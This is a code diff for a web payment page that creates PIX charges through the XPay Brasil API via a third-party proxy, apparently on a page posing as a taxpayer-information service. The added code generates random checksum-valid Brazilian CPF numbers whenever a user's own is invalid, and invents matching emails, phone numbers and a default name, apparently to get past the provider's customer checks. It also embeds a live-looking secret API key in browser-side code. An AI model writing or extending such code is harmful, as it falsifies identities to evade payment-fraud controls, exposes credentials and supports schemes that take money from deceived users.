@@ -1269,38 +1269,65 @@
 
     const XPAY_API_KEY = "cpk_live_ex84lopcp2xexagmazz6za11";
 
+    function isValidCPF(cpf) {
+      if (!cpf) return false;
+      cpf = String(cpf).replace(/\D/g, '');
+      if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+      let sum = 0, rest;
+      for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
+      rest = (sum * 10) % 11;
+      if (rest === 10 || rest === 11) rest = 0;
+      if (rest !== parseInt(cpf.substring(9, 10))) return false;
+      sum = 0;
+      for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
+      rest = (sum * 10) % 11;
+      if (rest === 10 || rest === 11) rest = 0;
+      if (rest !== parseInt(cpf.substring(10, 11))) return false;
+      return true;
+    }
+
     function generateRandomCPF() {
-      const rnd = n => Math.round(Math.random() * n);
-      const mod = (dividendo, divisor) => Math.round(dividendo - (Math.floor(dividendo / divisor) * divisor));
-      const n = Array(9).fill(0).map(() => rnd(9));
-      let d1 = n.reduce((total, number, index) => (2 + index) * number + total, 0);
-      d1 = 11 - mod(d1, 11);
-      if (d1 >= 10) d1 = 0;
-      let d2 = d1 * 2 + n.reduce((total, number, index) => (3 + index) * number + total, 0);
-      d2 = 11 - mod(d2, 11);
-      if (d2 >= 10) d2 = 0;
-      return `${n.reverse().join('')}${d1}${d2}`;
+      const rnd = () => Math.floor(Math.random() * 9);
+      const n = Array(9).fill(0).map(rnd);
+      let d1 = 0;
+      for (let i = 0; i < 9; i++) d1 += n[i] * (10 - i);
+      d1 = (d1 * 10) % 11;
+      if (d1 === 10 || d1 === 11) d1 = 0;
+      let d2 = 0;
+      for (let i = 0; i < 9; i++) d2 += n[i] * (11 - i);
+      d2 += d1 * 2;
+      d2 = (d2 * 10) % 11;
+      if (d2 === 10 || d2 === 11) d2 = 0;
+      return '' + n.join('') + d1 + d2;
     }
 
     async function callXPayApi(path, method, body) {
-      // 1. Tenta pagamento.php (caso esteja em servidor PHP como cPanel/Hostinger)
-      try {
-        let isPost = (method === 'POST');
-        let localUrl = isPost ? 'pagamento.php' : ('pagamento.php?action=consultar&id=' + encodeURIComponent(path.replace('/charge/', '')));
-        let res = await fetch(localUrl, {
-          method: isPost ? 'POST' : 'GET',
-          headers: { 'Content-Type': 'application/json' },
-          body: isPost ? JSON.stringify(body) : undefined
-        });
-        if (res.ok) {
-          let json = await res.json();
-          if (json && (json.success || json.id || json.brCode || json.paid !== undefined)) {
-            return json;
-          }
-        }
-      } catch (e) {}
+      let isPost = (method === 'POST');
 
-      // 2. Fallback para GitHub Pages / Hospedagem Estática via Proxy Seguro
+      // 1. Tenta pagamento.php APENAS se for servidor com suporte a PHP ativo (não GitHub Pages nem estático)
+      const isStaticHost = window.location.hostname.includes('github.io') || 
+                           window.location.protocol.startsWith('file') || 
+                           window.location.hostname.includes('consultor-informativo.click');
+      
+      if (!isStaticHost) {
+        try {
+          let localUrl = isPost ? 'pagamento.php' : ('pagamento.php?action=consultar&id=' + encodeURIComponent(path.replace('/charge/', '')));
+          let res = await fetch(localUrl, {
+            method: isPost ? 'POST' : 'GET',
+            headers: { 'Content-Type': 'application/json' },
+            body: isPost ? JSON.stringify(body) : undefined
+          });
+          let cType = res.headers.get('content-type') || '';
+          if (res.ok && cType.includes('application/json')) {
+            let json = await res.json();
+            if (json && (json.success || json.id || json.brCode || json.paid !== undefined)) {
+              return json;
+            }
+          }
+        } catch (e) {}
+      }
+
+      // 2. Chamada direta via Proxy Seguro (Scalar) para XPay Brasil (garante CORS liberado e rapidez no GitHub Pages)
       let targetUrl = "https://api.xpaybrasil.com/v1" + path;
       let proxyUrl = "https://proxy.scalar.com/?scalar_url=" + encodeURIComponent(targetUrl);
       
@@ -1312,21 +1339,21 @@
         }
       };
 
-      if (method === 'POST') {
+      if (isPost) {
         let cleanCpf = (body && body.cpf ? String(body.cpf).replace(/\D/g, '') : '');
-        if (cleanCpf.length !== 11 || /^(.)\1+$/.test(cleanCpf)) {
+        if (!isValidCPF(cleanCpf)) {
           cleanCpf = generateRandomCPF();
         }
-        let nomeLimpo = (body && body.nome ? String(body.nome).trim() : 'Contribuinte');
+        let nomeLimpo = (body && body.nome && body.nome.trim().length >= 3) ? String(body.nome).trim() : 'Contribuinte Social';
 
         let payload = {
-          amount: body && body.amount ? body.amount : 6825,
+          amount: (body && body.amount) ? body.amount : 6825,
           expiresIn: 3600,
           customer: {
             taxId: cleanCpf,
             name: nomeLimpo,
-            email: "cliente" + cleanCpf.slice(0, 6) + "@email.com",
-            phone: "11999999999"
+            email: "contato" + cleanCpf.slice(0, 6) + "@gmail.com",
+            phone: "1198" + cleanCpf.slice(0, 7)
           }
         };
         fetchOpts.body = JSON.stringify(payload);
